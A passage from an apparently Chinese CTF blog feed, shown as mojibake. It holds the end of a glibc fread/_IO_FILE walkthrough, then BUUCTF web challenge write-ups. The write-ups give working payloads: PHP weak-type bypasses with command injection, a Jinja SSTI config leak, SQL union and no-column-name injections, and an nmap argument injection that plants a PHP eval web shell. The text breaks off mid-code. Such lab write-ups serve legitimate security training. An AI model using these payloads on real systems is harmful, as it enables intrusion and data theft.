è°ƒç”¨<code>_IO_SYSREAD</code>ï¼ˆvtableä¸­çš„<code>_IO_file_read</code>å‡½æ•°ï¼‰ï¼Œè¯¥å‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨readï¼Œè¯»å–æ–‡ä»¶æ•°æ®ï¼Œæ•°æ®è¯»å…¥åˆ°<code>fp-&gt;_IO_buf_base</code>ä¸­ï¼Œè¯»å…¥å¤§å°ä¸ºè¾“å…¥ç¼“å†²åŒºçš„å¤§å°<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>ã€‚</li><li> è®¾ç½®è¾“å…¥ç¼“å†²åŒºå·²æœ‰æ•°æ®çš„sizeï¼Œå³è®¾ç½®<code>fp-&gt;_IO_read_end</code>ä¸º<code>fp-&gt;_IO_read_end += count</code>ã€‚</li></ol><p>å…¶ä¸­ç¬¬å››æ­¥çš„<code>_IO_SYSREAD</code>ï¼ˆvtableä¸­çš„<code>_IO_file_read</code>å‡½æ•°ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_ssize_t</span><br><span class="line">_IO_file_read (_IO_FILE *fp, <span class="keyword">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">           ? read_not_cancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">           : read (fp-&gt;_fileno, buf, size));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œåï¼ŒFILEç»“æ„ä½“çš„å„ä¸ªæŒ‡é’ˆå·²è¢«èµ‹å€¼ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> *_IO_list_all</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000, </span><br><span class="line">    _IO_read_ptr = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_read_end = 0x60224a &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602240 &quot;111111111\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x603240 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = 3, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><ol><li> <code>_IO_sgetn</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_xsgetn</code>ã€‚</li><li> <code>_IO_doallocbuf</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li> vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li> <code>__underflow</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_underflow</code>å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</li><li> vtableä¸­çš„<code>_IO_new_file_underflow</code>è°ƒç”¨äº†vtable<code>__GI__IO_file_read</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;å¼€å§‹å¹²__IO_FILEã€‚ä¼šä¾æ¬¡è°ƒfopen,fwrite,freadä¹‹ç±»çš„IOå‡½æ•°çš„æºç ã€‚&lt;/p&gt;
&lt;h1 id=&quot;IO-FILEä¹‹fopenè¯¦è§£&quot;&gt;&lt;a href=&quot;#IO-FILEä¹‹fopenè¯¦è§£&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_WEBåˆ·é¢˜_0x30-0x3F</title>
    <link href="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/"/>
    <id>http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/</id>
    <published>2021-09-15T16:00:00.000Z</published>
    <updated>2021-10-06T08:23:40.973Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="0x30-WUSTCTF2020-æœ´å®æ— å-å®¡è®¡"><a href="#0x30-WUSTCTF2020-æœ´å®æ— å-å®¡è®¡" class="headerlink" title="0x30.[WUSTCTF2020]æœ´å®æ— å(å®¡è®¡)"></a>0x30.[WUSTCTF2020]æœ´å®æ— å(å®¡è®¡)</h1><p>robotsæ‰¾åˆ°ä¸ªæ–‡ä»¶<code>fAke_f1agggg.php</code>ï¼Œå‡çš„flagï¼ŒæŸ¥çœ‹å¤´ï¼Œæ‰¾åˆ°fl4g.phpã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="string">&#x27;1e10&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span>);                    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span>+<span class="number">1</span>);                  <span class="comment">// 1410065409</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆlevel1å°±å¾ˆå¥½ç»•è¿‡äº†ã€‚level2ï¼šå¼±ç±»å‹ç»•è¿‡ï¼š<code>0e215962017</code></p><p>level3è¿‡æ»¤äº†catï¼Œå¯ä»¥ä½¿ç”¨tacï¼Œä¹Ÿè¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨<code>$IFS$9</code>ç»•è¿‡</p><p>æœ€ç»ˆpayload:<code>num=1e10&amp;md5=0e215962017&amp;get_flag=$IFS1ffffllllaaaggg</code></p><h1 id="0x31-WesternCTF2018-shrine-SSTI"><a href="#0x31-WesternCTF2018-shrine-SSTI" class="headerlink" title="0x31.[WesternCTF2018]shrine(SSTI)"></a>0x31.[WesternCTF2018]shrine(SSTI)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>&#123;&#123;7*7&#125;&#125;</code>å‘ç°æœ‰SSTI</p><p>æ³¨å†Œäº†ä¸€ä¸ªåå­—ä¸º<code>FLAG</code>çš„configï¼ŒåŒæ—¶è¿™ä¸ªé¢˜ç›®æŠŠ<code>(),config,self</code>éƒ½è¿‡æ»¤æ‰äº†ï¼Œå¹¶ä¸”é»‘åå•è®¾ç½®çš„æ—¶å€™ï¼Œæ›¿æ¢ä¸ºç©ºã€‚</p><p>é‚£ä¹ˆå¯ä»¥ä½¿ç”¨pythonçš„å†…ç½®å‡½æ•°<code>url_for</code>å’Œ<code>get_flashed_messages</code></p><p><code>url_for.__globals__</code>å‘ç°ï¼š<code>&#39;current_app&#39;: &lt;Flask &#39;app&#39;&gt;</code></p><p><code>current_app</code>å°±æ˜¯å½“å‰ä¸‹çš„appï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹å½“å‰appä¸‹çš„config</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x32-SWPU2019-Web1-æ— åˆ—åæ³¨å…¥"><a href="#0x32-SWPU2019-Web1-æ— åˆ—åæ³¨å…¥" class="headerlink" title="0x32.[SWPU2019]Web1(æ— åˆ—åæ³¨å…¥)"></a>0x32.[SWPU2019]Web1(æ— åˆ—åæ³¨å…¥)</h1><blockquote><p>  <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>  information_schemaè¢«wafï¼Œæ— åˆ—åæ³¨å…¥</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ— åˆ—åæ³¨å…¥</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ä½¿ç”¨è¿™ä¸ªè¯­å¥ï¼Œå‰é¢çš„<span class="keyword">select</span> <span class="number">1</span>ï¼Œ<span class="number">2</span>ï¼Œ<span class="number">3</span> ä¼šå˜æˆåˆ—åã€‚å¦‚æœæ­¤æ—¶æˆ‘ä»¬å†ä½¿ç”¨ä¸‹é¢çš„è¯­å¥</span><br><span class="line">slecet <span class="number">2</span> form (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a; </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬çš„ç¬¬äºŒåˆ—çš„æ‰€æœ‰æ•°æ®</span><br></pre></td></tr></table></figure><p>é€šè¿‡æµ‹è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œorå’Œæ³¨é‡Šç¬¦å·ï¼Œè¿™æ ·orderbyå’Œinformation_schemaéƒ½ä½¿ç”¨ä¸äº†äº†ã€‚</p><p>information_schemaä½¿ç”¨ä¸äº†å¯ä»¥ä½¿ç”¨InnoDbå¼•æ“æˆ–è€…sysæ•°æ®åº“</p><blockquote><p>  ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p><p>  åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚</p><p>  sysåº“éœ€è¦rootæƒé™æ‰èƒ½è®¿é—®ã€‚innodbåœ¨mysqlä¸­æ˜¯é»˜è®¤å…³é—­çš„ã€‚</p></blockquote><p>ç©ºæ ¼å¯ä»¥ç”¨å†…è”/**/æ¥ç»•è¿‡</p><p>ç»è¿‡æµ‹è¯•å‘ç°æœ‰22ä¸ªå­—æ®µï¼Œå›æ˜¾åœ¨2å’Œ3ï¼š</p><blockquote><p>  -1â€™/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22â€™</p></blockquote><p>æ¯”èµ›ä¸­bypass <code>information_schema</code>æ˜¯ç”¨çš„<code>sys.schema_auto_increment_columns</code>ï¼Œä½†æ˜¯buuå¹³å°æ²¡æœ‰è¿™ä¸ªåº“ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ï¼š</p><p>innodb</p><ul><li>  è¡¨å¼•æ“ä¸ºinnodb</li><li>  MySQL&gt; 5.5</li><li>  innodb_ table_statsã€ innodb_table_indexå­˜ æ”¾æ‰€æœ‰åº“åè¡¨å</li><li>  <code>select table_name from mysql.innodb_table_stats where database_ name=åº“å</code>;</li></ul><p>è¿™ä¸ªæ–¹æ³•åœ¨buuä¹Ÿä¸è¡Œã€‚ã€‚ã€‚</p><p>æ‰€ä»¥åªèƒ½æ— åˆ—åæ³¨å…¥ï¼š</p><p>ä½¿ç”¨innodbç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>æŸ¥åˆ°æœ‰adså’Œusersä¸¤å¼ è¡¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`2`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¦ä¸€åˆ—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h1 id="0x33-ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#0x33-ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="0x33.[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>0x33.[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p>ä½¿ç”¨çš„æ˜¯nmapï¼Œæç¤ºåœ¨/flagä¸­ï¼Œæ‰€ä»¥å¯ä»¥å†™å…¥åˆ°æ–‡ä»¶ï¼š</p><p><code>&#39; -iL /flag -oN flag.txt &#39;</code></p><p>è§£æ³•äºŒï¼š</p><p><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><p>å›æ˜¾äº†hacker</p><p><code>&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></p><p>å¯ä»¥è®¿é—®ï¼Œèšå‰‘å°±OKã€‚</p><h1 id="0x34-SUCTF-2019-Pythonginx"><a href="#0x34-SUCTF-2019-Pythonginx" class="headerlink" title="0x34.[SUCTF 2019]Pythonginx"></a>0x34.[SUCTF 2019]Pythonginx</h1><blockquote><p>  çŸ¥è¯†ç‚¹ï¼š</p><ol><li><p>blackhat2019çš„ä¸€ä¸ªè®®é¢˜ï¼š<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><p>  å¤§è‡´å°±æ˜¯è¯´å‡å¦‚<a href="http://evil.câ„€.comç»è¿‡å¤„ç†ä¼šå˜æˆhttp://evil.ca/c.com">http://evil.câ„€.comç»è¿‡å¤„ç†ä¼šå˜æˆhttp://evil.ca/c.com</a></p></li><li><p>  åœ¨unicodeä¸­å­—ç¬¦â„€(U+2100)ï¼Œå½“IDNAå¤„ç†æ­¤å­—ç¬¦æ—¶ï¼Œä¼šå°†â„€å˜æˆa/cï¼Œå› æ­¤å½“ä½ è®¿é—®æ­¤urlæ—¶ï¼ŒdnsæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†urlé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨å¼•ç”¨å‰ç«¯urlæ—¶ï¼Œåªå¯¹åŸŸååšäº†é™åˆ¶ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾ç»•è¿‡æœåŠ¡å™¨å¯¹åŸŸåçš„é™åˆ¶äº†ã€‚</p></li><li><p>  <strong>CVE-2019-9636ï¼šurlsplitä¸å¤„ç†NFKCæ ‡å‡†åŒ–</strong></p></li><li><p>  Nginxé‡è¦æ–‡ä»¶çš„ä½ç½®</p></li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nginxé‡è¦æ–‡ä»¶ä½ç½®</span><br><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š/usr/lisb64/nginx/modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span 